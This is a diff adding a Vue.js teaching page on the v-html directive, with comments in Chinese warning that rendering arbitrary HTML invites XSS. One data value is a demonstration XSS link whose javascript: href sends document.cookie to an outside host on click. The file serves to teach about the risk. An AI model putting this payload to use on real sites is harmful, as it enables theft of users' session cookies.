@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>16b_v-html</title>
+        <script src="../vue_basic/vue.js"></script>
+    </head>
+    <body>
+        <!-- 
+            v-html指令：
+                - 作用：向指定節點中渲染包含html結構的內容
+                - 與插值語法的區別：
+                    a. v-html會替換掉節點中的所有內容
+                    b. v-html可以識別html結構
+                - 嚴重注意：v-html有安全性問題：
+                    a. 在網站上動態渲任意HTML是非常危險的，容易導致XSS攻擊
+                    b. 一定要在可信的內容上使用v-html，永遠不要再用戶提交的內容上使用
+        -->
+        <div id="demo">
+            <div>Hello, {{name}}</div>
+            <div v-html="str"></div>
+            <div v-html="str2"></div>
+        </div>
+    </body>
+    <script>
+        Vue.config.productionTip = false
+
+        const vm = new Vue({
+            el:'#demo',
+            data:{
+                name:'Donald',
+                str: '<h3>Hello World</h3>',
+                str2: '<a href=javascript:location.href="http://www.google.com?" + document.cookie>Click Me</a>'
+            },
+            methods:{
+                
+            }
+        })
+    </script>
+</html>
